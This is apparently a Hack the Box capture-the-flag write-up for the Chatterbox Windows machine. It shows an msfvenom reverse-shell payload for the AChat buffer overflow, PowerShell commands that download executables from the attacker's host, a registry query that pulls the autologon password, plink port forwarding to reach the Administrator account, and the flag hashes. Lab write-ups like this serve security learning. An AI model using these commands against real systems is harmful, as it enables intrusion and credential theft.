---
layout: post
title:  "HTB Chatterbox Windows"
description: Chatterbox, is a medium difficulty machine from Hack the Box! Great for learning enumeration on windows
tags: Windows, HTB, enumeration
---

# Recon
1. Nmap scan
```shell
PORT     STATE SERVICE REASON          VERSION
9255/tcp open  http    syn-ack ttl 127 AChat chat system httpd
|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp open  achat   syn-ack ttl 127 AChat chat system
```

# EXPLOITATION
1. We use Achat python exploit "CVE:2015-1578 2015-1577"
2. We create a msfvenom shellcode to use with the Achat BoF with a windows/shell_reverse_tcp
```shell
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.34 LPORT=9999 -e x86/unicode_mixed -b
'\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d
\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c
\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab
\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba
\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9
\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8
\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7
\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6
\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```
3. We set-up nc and we get shell as user Alfred.

**Optional**: You can create a meterpreter shell with msfvenom and upload it to the targer machine. Then use multi/handler to caght it.Ex
```shell
powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.34/reverse.exe', 'reverse.exe')"
```

# Privelege Escalation Port-forwarding
1. Doing some priv-esc check we find the password for user Alfred

```shell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

```shell
DefaultDomainName    REG_SZ    
DefaultUserName    REG_SZ    Alfred
DefaultPassword    REG_SZ    Welcome1!
```
2. We use the obtanined credentials and try to reuse them with the admin account. To do that we need to set up SSH in our machine
and  open smb port 445 in our target machine using "plink.exe". Then we do a port-forwarding and then a reverse connection. 
First.
```shell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.34/plink.exe', 'plink.exe')"
``
Then.
```shell
plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.34
```
3. We check with netstat to make sure the port 445 is open and connecte to us
4. The we connect reverse using **winexe** and password **"Welcome1!** and we get Admin.
```shell
winexe -U Administrator //127.0.0.1 "cmd.exe
```
|Flags| Hash|
|---|---|
| User | 72290246dfaedb1e3e3ac9d6fb306334|
| Root |a673d1b1fa95c276c5ef2aa13d9dcc7c|
